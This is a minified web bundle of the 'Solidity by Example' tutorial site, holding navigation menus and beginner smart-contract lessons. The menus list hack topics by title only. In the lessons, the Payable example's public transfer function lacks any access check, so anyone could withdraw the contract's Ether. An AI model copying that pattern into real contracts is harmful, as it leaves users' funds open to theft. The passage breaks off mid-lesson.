(this["webpackJsonpsolidity-by-example"]=this["webpackJsonpsolidity-by-example"]||[]).push([[0],{10:function(n,e,t){n.exports={component:"Header_component__1tkkW",logo:"Header_logo__2ins2",header:"Header_header__3mObx",versions:"Header_versions__eOBao",bar:"Header_bar__23jec",version:"Header_version__1QJXf"}},11:function(n,e,t){n.exports={component:"Footer_component__2wm-B",row:"Footer_row__3cluQ",bar:"Footer_bar__93usQ"}},13:function(n,e,t){n.exports={component:"App_component__1dd61",main:"App_main__3ZkGI",footer:"App_footer__29Fsv"}},17:function(n,e,t){n.exports={component:"Example_component__mzuGC",content:"Example_content__3-AiU"}},22:function(n,e,t){n.exports=t.p+"static/media/logo.da793b47.svg"},26:function(n,e,t){n.exports={component:"Label_component__G3rSZ"}},30:function(n,e,t){n.exports=t(41)},35:function(n,e,t){},41:function(n,e,t){"use strict";t.r(e);var a=t(0),i=t.n(a),o=t(15),r=(t(35),t(28)),s=t(2),c=t(13),l=t.n(c),d=t(10),u=t.n(d),p=t(22),h=t.n(p);var m=function(){return i.a.createElement("div",{className:u.a.component},i.a.createElement("a",{href:"/"},i.a.createElement("img",{src:h.a,alt:"logo",className:u.a.logo})),i.a.createElement("h3",{className:u.a.header},i.a.createElement("a",{href:"/"},"Solidity by Example"),i.a.createElement("div",{className:u.a.versions},i.a.createElement("div",{className:u.a.version},"version"),i.a.createElement("a",{href:"/0.6"},"0.6"),i.a.createElement("div",{className:u.a.bar}," | "),i.a.createElement("a",{href:"/0.5"},"0.5"))))},b=t(11),g=t.n(b);const f="0xA8DD4bA80d8904d7cAcE5c3622CCf78bEa5AcFEe";var y=function(){return i.a.createElement("div",{className:g.a.component},i.a.createElement("div",{className:g.a.row},"Donate"," ",i.a.createElement("span",{role:"img","aria-label":"smiley"},"\ud83d\ude42")),i.a.createElement("div",{className:g.a.row},i.a.createElement("a",{href:"https://etherscan.io/address/".concat(f),target:"__blank"},f.slice(0,6),"...",f.slice(-6,-1))),i.a.createElement("div",{className:g.a.row},i.a.createElement("a",{href:"mailto:contact@solidity-by-example.org"},"contact@solidity-by-example.org")),i.a.createElement("div",{className:g.a.row},i.a.createElement("a",{href:"https://github.com/solidity-by-example/solidity-by-example.github.io",target:"__blank"},"source"),i.a.createElement("div",{className:g.a.bar},"|"),i.a.createElement("a",{href:"https://github.com/solidity-by-example/solidity-by-example.github.io/blob/gh-pages/LICENSE",target:"__blank"},"license")))},w=t(7),v=t(23);var k=({title:n,description:e})=>i.a.createElement(v.a,null,i.a.createElement("title",null,n),i.a.createElement("meta",{name:"Description",content:e})),x=t(26),_=t.n(x);var E=()=>i.a.createElement("span",{className:_.a.component,style:{backgroundColor:"#fbbc04"}},"Breaking changes"),A=t(8),S=t.n(A);var T=({version:n,routesByCategory:e})=>i.a.createElement("div",{className:S.a.component},i.a.createElement(k,{title:"Solidity by Example | ".concat(n),description:"Learn smart contract programming using Solidity"}),i.a.createElement("h1",{className:S.a.header},i.a.createElement("a",{href:"/"},"Solidity by Example")),i.a.createElement("div",{className:S.a.subHeader},"v ",n),i.a.createElement("div",{className:S.a.main},i.a.createElement("p",null,"an introduction to"," ",i.a.createElement("a",{href:"https://solidity.readthedocs.io"},"Solidity")," with simple examples"),e.map(({routes:n,title:e},t)=>i.a.createElement("div",{key:t},e&&i.a.createElement("h3",null,e),i.a.createElement("ul",{className:S.a.list},n.map(({path:n,title:e,breakingChanges:t})=>i.a.createElement("li",{className:S.a.listItem,key:n},i.a.createElement("a",{href:n},e),t&&i.a.createElement("div",{className:S.a.label},i.a.createElement(E,null)))))))));const C=[{title:"",routes:[{path:"hello-world",title:"Hello World"},{path:"first-app",title:"First App"},{path:"primitives",title:"Primitive Data Types"},{path:"variables",title:"Variables"},{path:"state-variables",title:"Reading and Writing to a State Variable"},{path:"ether-units",title:"Ether and Wei"},{path:"gas",title:"Gas and Gas Price"},{path:"if-else",title:"If / Else"},{path:"loop",title:"For and While Loop"},{path:"mapping",title:"Mapping"},{path:"array",title:"Array"},{path:"enum",title:"Enum"},{path:"structs",title:"Structs"},{path:"data-locations",title:"Data Locations - Storage, Memory and Calldata"},{path:"function",title:"Function"},{path:"view-and-pure-functions",title:"View and Pure Functions"},{path:"error",title:"Error"},{path:"function-modifier",title:"Function Modifier"},{path:"events",title:"Events"},{path:"constructor",title:"Constructor"},{path:"inheritance",title:"Inheritance",breakingChanges:!0},{path:"shadowing-inherited-state-variables",title:"Shadowing Inherited State Variables",breakingChanges:!0},{path:"super",title:"Calling Parent Contracts"},{path:"visibility",title:"Visibility"},{path:"interface",title:"Interface"},{path:"payable",title:"Payable"},{path:"sending-ether",title:"Sending Ether - Transfer, Send, and Call"},{path:"fallback",title:"Fallback",breakingChanges:!0},{path:"call",title:"Call"},{path:"delegatecall",title:"Delegatecall"},{path:"calling-contract",title:"Calling Other Contract"},{path:"new-contract",title:"Creating Contracts from a Contract"},{path:"import",title:"Import"},{path:"library",title:"Library"},{path:"hashing",title:"Hashing with Keccak256"},{path:"signature",title:"Verifying Signature"}].map(n=>Object(w.a)({},n,{path:"".concat("/0.6","/").concat(n.path)}))},{title:"Applications",routes:[{path:"multi-sig-wallet",title:"Multi Sig Wallet"},{path:"merkle-tree",title:"Merkle Tree"},{path:"iterable-mapping",title:"Iterable Mapping"},{path:"erc20",title:"ERC20"},{path:"create2",title:"Precompute Contract Address with Create2"},{path:"uni-directional-payment-channel",title:"Uni-directional Payment Channel"},{path:"bi-directional-payment-channel",title:"Bi-directional Payment Channel"}].map(n=>Object(w.a)({},n,{path:"".concat("/0.6","/app/").concat(n.path)}))},{title:"Hacks",routes:[{path:"re-entrancy",title:"Re-Entrancy"},{path:"overflow",title:"Arithmetic Overflow and Underflow"},{path:"self-destruct",title:"Self Destruct"},{path:"accessing-private-data",title:"Accessing Private Data"},{path:"delegatecall",title:"Delegatecall"},{path:"randomness",title:"Source of Randomness"},{path:"denial-of-service",title:"Denial of Service"},{path:"phishing-with-tx-origin",title:"Phishing with tx.origin"},{path:"hiding-malicious-code-with-external-contract",title:"Hiding Malicious Code with External Contract"},{path:"honeypot",title:"Honeypot"},{path:"front-running",title:"Front Running"},{path:"block-timestamp-manipulation",title:"Block Timestamp Manipulation"}].map(n=>Object(w.a)({},n,{path:"".concat("/0.6","/hacks/").concat(n.path)}))}];var I=()=>i.a.createElement(T,{version:"0.6.10",routesByCategory:C}),M=t(16),B=t.n(M),D=(t(38),t(27));t.n(D)()(B.a),B.a.initHighlightingOnLoad();var F=({html:n})=>(Object(a.useEffect)(()=>{if("ReactSnap"===navigator.userAgent)return;document.querySelectorAll("pre").forEach(n=>{const e=document.createElement("div");e.className="buttons";const t=document.createElement("button");t.className="fa fa-copy clip-button",t.title="Copy to clipboard",t.ariaLabel="Copy to clipboard";const a=document.createElement("i");a.className="tooltiptext",t.appendChild(a),e.appendChild(t);const i=n.firstChild;n.insertBefore(e,i),t.addEventListener("click",e=>{e.preventDefault(),(n=>{const e=document.createElement("textarea");e.setAttribute("style","width:1px;border:0;opacity:0;"),document.body.appendChild(e),e.value=n.innerText,e.select(),document.execCommand("copy"),document.body.removeChild(e)})(n.childNodes[1])})})},[]),i.a.createElement("div",{dangerouslySetInnerHTML:{__html:n}})),L=t(17),q=t.n(L);var P=({title:n,version:e,description:t,html:a})=>i.a.createElement("div",{className:q.a.component},i.a.createElement(k,{title:"".concat(n," | Solidity by Example | ").concat(e),description:t}),i.a.createElement("div",{className:q.a.content},i.a.createElement("h2",null,n),i.a.createElement(F,{html:a}),i.a.createElement("p",null,"Try on"," ",i.a.createElement("a",{href:"https://remix.ethereum.org",target:"__blank"},"Remix"))));const H=[{title:"",routes:[{path:"hello-world",title:"Hello World"},{path:"first-app",title:"First App"},{path:"primitives",title:"Primitive Data Types"},{path:"variables",title:"Variables"},{path:"state-variables",title:"Reading and Writing to a State Variable"},{path:"ether-units",title:"Ether and Wei"},{path:"gas",title:"Gas and Gas Price"},{path:"if-else",title:"If / Else"},{path:"loop",title:"For and While Loop"},{path:"mapping",title:"Mapping"},{path:"array",title:"Array"},{path:"enum",title:"Enum"},{path:"structs",title:"Structs"},{path:"data-locations",title:"Data Locations - Storage, Memory and Calldata"},{path:"function",title:"Function"},{path:"view-and-pure-functions",title:"View and Pure Functions"},{path:"error",title:"Error"},{path:"function-modifier",title:"Function Modifier"},{path:"events",title:"Events"},{path:"constructor",title:"Constructor"},{path:"inheritance",title:"Inheritance"},{path:"shadowing-inherited-state-variables",title:"Shadowing Inherited State Variables"},{path:"super",title:"Calling Parent Contracts"},{path:"visibility",title:"Visibility"},{path:"interface",title:"Interface"},{path:"payable",title:"Payable"},{path:"sending-ether",title:"Sending Ether - Transfer, Send, and Call"},{path:"fallback",title:"Fallback"},{path:"call",title:"Call"},{path:"delegatecall",title:"Delegatecall"},{path:"calling-contract",title:"Calling Other Contract"},{path:"new-contract",title:"Creating Contracts from a Contract"},{path:"import",title:"Import"},{path:"library",title:"Library"},{path:"hashing",title:"Hashing with Keccak256"},{path:"signature",title:"Verifying Signature"}].map(n=>Object(w.a)({},n,{path:"".concat("/0.5","/").concat(n.path)}))},{title:"Applications",routes:[{path:"multi-sig-wallet",title:"Multi Sig Wallet"},{path:"merkle-tree",title:"Merkle Tree"},{path:"iterable-mapping",title:"Iterable Mapping"},{path:"erc20",title:"ERC20"},{path:"create2",title:"Precompute Contract Address with Create2"},{path:"uni-directional-payment-channel",title:"Uni-directional Payment Channel"},{path:"bi-directional-payment-channel",title:"Bi-directional Payment Channel"}].map(n=>Object(w.a)({},n,{path:"".concat("/0.5","/app/").concat(n.path)}))},{title:"Hacks",routes:[{path:"re-entrancy",title:"Re-Entrancy"},{path:"overflow",title:"Arithmetic Overflow and Underflow"},{path:"self-destruct",title:"Self Destruct"},{path:"accessing-private-data",title:"Accessing Private Data"},{path:"delegatecall",title:"Delegatecall"},{path:"randomness",title:"Source of Randomness"},{path:"denial-of-service",title:"Denial of Service"},{path:"phishing-with-tx-origin",title:"Phishing with tx.origin"},{path:"hiding-malicious-code-with-external-contract",title:"Hiding Malicious Code with External Contract"},{path:"honeypot",title:"Honeypot"},{path:"front-running",title:"Front Running"},{path:"block-timestamp-manipulation",title:"Block Timestamp Manipulation"}].map(n=>Object(w.a)({},n,{path:"".concat("/0.5","/hacks/").concat(n.path)}))}];var R=[{path:"/0.6",component:I},{path:"/0.6/visibility",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Visibility",description:"An example of external, internal, private and public functions in Solidity",html:'<p>Functions and state variables have to declare whether they are accessible by other contracts.</p>\n<p>Fucntions can be declared as</p>\n<ul>\n<li><code>public</code> - any contract and account can call</li>\n<li><code>private</code> - only inside the contract that defines the function</li>\n<li><code>internal</code>- only inside contract that inherits an <code>internal</code> function</li>\n<li><code>external</code> - only other contracts and accounts can call</li>\n</ul>\n<p>State variables can be declared as <code>public</code>, <code>private</code>, or <code>internal</code> but not <code>external</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Base {\n    // Private function can only be called\n    // - inside this contract\n    // Contracts that inherit this contract cannot call this function.\n    function privateFunc() private pure returns (string memory) {\n        return "private function called";\n    }\n\n    function testPrivateFunc() public pure returns (string memory) {\n        return privateFunc();\n    }\n\n    // Internal function can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    function internalFunc() internal pure returns (string memory) {\n        return "internal function called";\n    }\n\n    function testInternalFunc() public pure virtual returns (string memory) {\n        return internalFunc();\n    }\n\n    // Public functions can be called\n    // - inside this contract\n    // - inside contracts that inherit this contract\n    // - by other contracts and accounts\n    function publicFunc() public pure returns (string memory) {\n        return "public function called";\n    }\n\n    // External functions can only be called\n    // - by other contracts and accounts\n    function externalFunc() external pure returns (string memory) {\n        return "external function called";\n    }\n\n    // This function will not compile since we&#39;re trying to call\n    // an external function here.\n    // function testExternalFunc() public pure returns (string memory) {\n    //     return externalFunc();\n    // }\n\n    // State variables\n    string private privateVar = "my private variable";\n    string internal internalVar = "my internal variable";\n    string public publicVar = "my public variable";\n    // State variables cannot be external so this code won&#39;t compile.\n    // string external externalVar = "my external variable";\n}\n\ncontract Child is Base {\n    // Inherited contracts do not have access to private functions\n    // and state variables.\n    // function testPrivateFunc() public pure returns (string memory) {\n    //     return privateFunc();\n    // }\n\n    // Internal function call be called inside child contracts.\n    function testInternalFunc() public pure override returns (string memory) {\n        return internalFunc();\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/view-and-pure-functions",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"View and Pure Functions",description:"An example of view and pure functions in Solidity",html:'<p>Getter functions can be declared <code>view</code> or <code>pure</code>.</p>\n<p><code>View</code> function declares that no state will be changed.</p>\n<p><code>Pure</code> function declares that no state variable will be changed or read.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract ViewAndPure {\n    uint public x = 1;\n\n    // Promise not to modify the state.\n    function addToX(uint y) public view returns (uint) {\n        return x + y;\n    }\n\n    // Promise not to modify or read from the state.\n    function add(uint i, uint j) public pure returns (uint) {\n        return i + j;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/variables",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Variables",description:"Local, state and global variables",html:'<p>There are 3 types of variables in Solidity</p>\n<ul>\n<li><strong>local</strong><ul>\n<li>declared inside a function</li>\n<li>not stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>state</strong><ul>\n<li>declared outside a function</li>\n<li>stored on the blockchain</li>\n</ul>\n</li>\n<li><strong>global</strong> (provides information about the blockchain)</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Variables {\n    // State varaibles are stored on the blockchain.\n    string public text = "Hello";\n    uint public num = 123;\n\n    function doSomething() public {\n        // Local variables are not saved to the blockchain.\n        uint i = 456;\n\n        // Here are some global variables\n        uint timestamp = block.timestamp; // Current block timestamp\n        address sender = msg.sender; // address of the caller\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/super",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Calling Parent Contracts",description:"An example of calling parent contracts in Solidity",html:'<p>Parent contracts can be called directly, or by using the keyword <code>super</code>.</p>\n<p>By using the keyword <code>super</code>, all of the immediate parent contracts will be called.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/* Inheritance tree\n   A\n /  \\\nB   C\n \\ /\n  D\n*/\n\ncontract A {\n    // This is called an event. You can emit events from your function\n    // and they are logged into the transaction log.\n    // In our case, this will be useful for tracing function calls.\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log("A.foo called");\n    }\n\n    function bar() public virtual {\n        emit Log("A.bar called");\n    }\n}\n\ncontract B is A {\n    function foo() public virtual override {\n        emit Log("B.foo called");\n        A.foo();\n    }\n    function bar() public virtual override {\n        emit Log("B.bar called");\n        super.bar();\n    }\n}\n\ncontract C is A {\n    function foo() public virtual override {\n        emit Log("C.foo called");\n        A.foo();\n    }\n\n    function bar() public virtual override {\n        emit Log("C.bar called");\n        super.bar();\n    }\n}\n\ncontract D is B, C {\n    // Try:\n    // - Call D.foo and check the transaction logs.\n    //   Although D inherits A, B and C, it only called C and then A.\n    // - Call D.bar and check the transaction logs\n    //   D called C, then B, and finally A.\n    //   Although super was called twice (by B and C) it only called A once.\n\n    function foo() public override(B, C) {\n        super.foo();\n    }\n\n    function bar() public override(B, C) {\n        super.bar();\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/structs",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Structs",description:"An example of how to use structs in Solidity",html:'<p>You can define your own type by creating a <code>struct</code>.</p>\n<p>They are useful for grouping togther related data.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Todos {\n    struct Todo {\n        string text;\n        bool completed;\n    }\n\n    // An array of &#39;Todo&#39; structs\n    Todo[] public todos;\n\n    function create(string memory _text) public {\n        // 3 ways to initialize a struct\n        // - calling it like a function\n        todos.push(Todo(_text, false));\n\n        // key value mapping\n        todos.push(Todo({\n            text: _text,\n            completed: false\n        }));\n\n        // initialize an emoty struct and then update it\n        Todo memory todo;\n        todo.text = _text;\n        // todo.completed initialized to false\n\n        todos.push(todo);\n    }\n\n    // Solidity automatically created a getter for&#39; todos&#39; so\n    // you don&#39;t actually need this function.\n    function get(uint _index) public view\n        returns (string memory text, bool completed)\n    {\n        Todo storage todo = todos[_index];\n        return (todo.text, todo.completed);\n    }\n\n    // update text\n    function update(uint _index, string memory _text) public {\n        Todo storage todo = todos[_index];\n        todo.text = _text;\n    }\n    // update completed\n    function toggleCompleted(uint _index) public {\n        Todo storage todo = todos[_index];\n        todo.completed = !todo.completed;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/state-variables",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Reading and Writing to a State Variable",description:"Reading and Writing to a State Variable",html:'<p>You need to send a transaction to the blockchain to write or update a state variable.</p>\n<p>This means that you will have to pay a transaction fee.</p>\n<p>On the other hand, you can read a data from a state variable, for free, without sending any transaction.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract SimpleStorage {\n    // State variable to store a number\n    uint public num;\n\n    // You need to send a transaction to write to a state variable.\n    function set(uint _num) public {\n        num = _num;\n    }\n\n    // You can read from a state varaible without sending a transaction.\n    // Actually we don&#39;t need this function. The compiler automatically\n    // creates getter functions for all public variables.\n    function get() public view returns (uint) {\n        return num;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/signature",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Verifying Signature",description:"An example of how to verify signatures in Solidity",html:'<p>Messages can be signed off chain and then verified on chain using a smart contract.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n\n*/\n\ncontract VerifySignature {\n    /* 1. Unlock MetaMask account\n    ethereum.enable()\n    */\n\n    /* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        "coffee and donuts",\n        1\n    )\n\n    hash = 0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd\n    */\n    function getMessageHash(\n        address _to, uint _amount, string memory _message, uint _nonce\n    )\n        public pure returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_to, _amount, _message, _nonce));\n    }\n\n    /* 3. Sign message hash\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function getEthSignedMessageHash(bytes32 _messageHash) public pure returns (bytes32) {\n        /*\n        Signature is produced by signing a keccak256 hash with the following format:\n        "\\x19Ethereum Signed Message\\n" + len(msg) + msg\n        */\n        return keccak256(abi.encodePacked("\\x19Ethereum Signed Message:\\n32", _messageHash));\n    }\n\n    /* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = "coffee and donuts"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function verify(\n        address _signer,\n        address _to, uint _amount, string memory _message, uint _nonce,\n        bytes memory signature\n    )\n        public pure returns (bool)\n    {\n        bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce);\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        return recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature)\n        public pure returns (address)\n    {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n\n        return ecrecover(_ethSignedMessageHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig)\n        public pure returns (bytes32 r, bytes32 s, uint8 v)\n    {\n        require(sig.length == 65, "invalid signature length");\n\n        assembly {\n            /*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */\n\n            // first 32 bytes, after the length prefix\n            r := mload(add(sig, 32))\n            // second 32 bytes\n            s := mload(add(sig, 64))\n            // final byte (first byte of the next 32 bytes)\n            v := byte(0, mload(add(sig, 96)))\n        }\n\n        // implicitly return (r, s, v)\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/shadowing-inherited-state-variables",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Shadowing Inherited State Variables",description:"An example of shadowing state variables by inheritance",html:'<p>Unlike functions, state variables cannot be overridden by re-declaring it\nin the child contract.</p>\n<p>Let&#39;s learn how to correctly override inherited state variables.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract A {\n    string public name = "Contract A";\n\n    function getName() public view returns (string memory) {\n        return name;\n    }\n}\n\n// Shadowing is disallowed in Solidity 0.6\n// This will not compile\n// contract B is A {\n//     string public name = "Contract B";\n// }\n\ncontract C is A {\n    // This is the correct way to override inherited state variables.\n    constructor() public {\n        name = "Contract C";\n    }\n\n    // C.getName returns "Contract C"\n}\n</code></pre>\n'})}},{path:"/0.6/sending-ether",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Sending Ether (transfer, send, call)",description:"An example of sending Ether in Solidity",html:'<h3 id="how-to-send-ether">How to send Ether?</h3>\n<p>You can send Ether to other contracts by</p>\n<ul>\n<li><code>transfer</code> (2300 gas, throws error)</li>\n<li><code>send</code> (2300 gas, returns bool)</li>\n<li><code>call</code> (forward all gas or set gas, returns bool)</li>\n</ul>\n<h3 id="how-to-receive-ether">How to receive Ether?</h3>\n<p>A contract receiving Ether must have at least one of the functions below</p>\n<ul>\n<li><code>receive() external payable</code></li>\n<li><code>fallback() external payable</code></li>\n</ul>\n<p><code>receive()</code> is called if <code>msg.data</code> is empty, otherwise <code>fallback()</code> is called.</p>\n<h3 id="which-method-should-you-use">Which method should you use?</h3>\n<p><code>call</code> in combination with re-entrancy guard is the recommended method to use after December 2019.</p>\n<p>Guard against re-entrancy by</p>\n<ul>\n<li>making all state changes before calling other contracts</li>\n<li>using re-entrancy guard modifier</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract ReceiveEther {\n    /*\n    Which function is called, fallback() or receive()?\n\n           send Ether\n               |\n         msg.data is empty?\n              / \\\n            yes  no\n            /     \\\nreceive() exists?  fallback()\n         /   \\\n        yes   no\n        /      \\\n    receive()   fallback()\n    */\n\n    // Function to receive Ether. msg.data must be empty\n    receive() external payable {}\n\n    // Fallback function is called when msg.data is not empty\n    fallback() external payable {}\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract SendEther {\n    function sendViaTransfer(address payable _to) public payable {\n        // This function is no longer recommended for sending Ether.\n        _to.transfer(msg.value);\n    }\n\n    function sendViaSend(address payable _to) public payable {\n        // Send returns a boolean value indicating success or failure.\n        // This function is not recommended for sending Ether.\n        bool sent = _to.send(msg.value);\n        require(sent, "Failed to send Ether");\n    }\n\n    function sendViaCall(address payable _to) public payable {\n        // Call returns a boolean value indicating success or failure.\n        // This is the current recommended method to use.\n        (bool sent, bytes memory data) = _to.call{value: msg.value}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/primitives",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Primitive Data Types",description:"Primitive data types",html:'<p>Here we introduce you to some primitive data types available in Solidity.</p>\n<ul>\n<li><code>boolean</code></li>\n<li><code>uint</code></li>\n<li><code>int</code></li>\n<li><code>address</code></li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Primitives {\n    bool boo = true;\n\n    /*\n    uint stands for unsigned integer, meaning non negative integers\n    different sizes are available\n        uint8   ranges from 0 to 2 ** 8 - 1\n        uint16  ranges from 0 to 2 ** 16 - 1\n        ...\n        uint256 ranges from 0 to 2 ** 256 - 1\n    */\n    uint8 u8 = 1;\n    uint256 u256 = 456;\n    uint u = 123; // uint is an alias for uint256\n\n    /*\n    Negative numbers are allowed for int types.\n    Like uint, different ranges are available from uint8 to uint256\n    */\n    int8 i8 = -1;\n    int256 i256 = 456;\n    int i = -123; // int is same as int256\n\n    address addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;\n\n    // Default values\n    // Unassigned variables have a default value\n    bool defaultBoo; // false\n    uint defaultUint; // 0\n    int defaultInt; // 0\n    address defaultAddr; // 0x0000000000000000000000000000000000000000\n}\n</code></pre>\n'})}},{path:"/0.6/payable",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Payable",description:"An example of how to use the keyword payable in Solidity",html:'<p>Functions and addresses declared <code>payable</code> can receive <code>ether</code> into the contract.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Payable {\n    // Payable address can receive Ether\n    address payable public owner;\n\n    // Payable constructor can receive Ether\n    constructor() public payable {\n        owner = msg.sender;\n    }\n\n    // Function to deposit Ether into this contract.\n    // Call this function along with some Ether.\n    // The balance of this contract will be automatically updated.\n    function deposit() public payable {\n    }\n\n    // Call this function along with some Ether.\n    // The function will throw an error since this function is not payable.\n    function notPayable() public {\n    }\n\n    // Function to withdraw all Ether from this contract.\n    function withdraw() public {\n        // get the amount of Ether stored in this contract\n        uint amount = address(this).balance;\n\n        // send all Ether to owner\n        // Owner can receive Ether since the address of owner is payable\n        (bool success,) = owner.call{value: amount}("");\n        require(success, "Failed to send Ether");\n    }\n\n    // Function to transfer Ether from this contract to address from input\n    function transfer(address payable _to, uint _amount) public {\n        // Note that "to" is declared as payable\n        (bool success,) = _to.call{value: _amount}("");\n        require(success, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/new-contract",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Contract that Create other Contracts",description:"Learn how to create new contract from inside a contract with Solidity",html:'<p>Contracts can be created by other contracts using the <code>new</code> keyword.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Car {\n    address public owner;\n    string public model;\n\n    constructor(address _owner, string memory _model) public payable {\n        owner = _owner;\n        model = _model;\n    }\n}\n\ncontract CarFactory {\n    Car[] public cars;\n\n    function create(address _owner, string memory _model) public {\n        Car car = new Car(_owner, _model);\n        cars.push(car);\n    }\n\n    function createAndSendEther(address _owner, string memory _model)\n        public\n        payable\n    {\n        Car car = (new Car){value: msg.value}(_owner, _model);\n        cars.push(car);\n    }\n\n    function getCar(uint _index)\n        public\n        view\n        returns (address owner, string memory model, uint balance)\n    {\n        Car car = cars[_index];\n\n        return (car.owner(), car.model(), address(car).balance);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/mapping",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Mapping",description:"Example of using mapping in Solidity",html:'<p>Maps are created with the syntax <code>mapping(keyType =&gt; valueType)</code>.</p>\n<p><code>keyType</code> can be value types such as <code>uint</code>, <code>address</code> or <code>bytes</code>.</p>\n<p><code>valueType</code> can be any type including another mapping or an array.</p>\n<p>Mappings are not iterable.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Mapping {\n    // Mapping from address to uint\n    mapping(address =&gt; uint) public myMap;\n\n    function get(address _addr) public view returns (uint) {\n         // Mapping always returns a value.\n         // If the value was never set, it will return the default value.\n        return myMap[_addr];\n    }\n\n    function set(address _addr, uint _i) public {\n        // Update the value at this address\n        myMap[_addr] = _i;\n    }\n\n    function remove(address _addr) public {\n        // Reset the value to the default value.\n        delete myMap[_addr];\n    }\n}\n\ncontract NestedMapping {\n    // Nested mapping (mapping from address to another mapping)\n    mapping(address =&gt; mapping(uint =&gt; bool)) public nested;\n\n    function get(address _addr1, uint _i) public view returns (bool) {\n         // You can get values from a nested mapping\n         // even when it is not initialized\n        return  nested[_addr1][_i];\n    }\n\n    function set(address _addr1, uint _i, bool _boo) public {\n        nested[_addr1][_i] = _boo;\n    }\n\n    function remove(address _addr1, uint _i) public {\n        delete nested[_addr1][_i];\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/loop",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"For and While Loop",description:"Example of for and while loop in Solidity",html:'<p>Solidity supports <code>for</code>, <code>while</code>, and <code>do while</code> loops.</p>\n<p>Don&#39;t write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.</p>\n<p>For the reason above, <code>while</code> and <code>do while</code> loops are rarely used.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Loop {\n    function loop() public {\n        // for loop\n        for (uint i = 0; i &lt; 10; i++) {\n            if (i == 3) {\n                // Skip to next iteration with continue\n                continue;\n            }\n            if (i == 5) {\n                // Exit loop with break\n                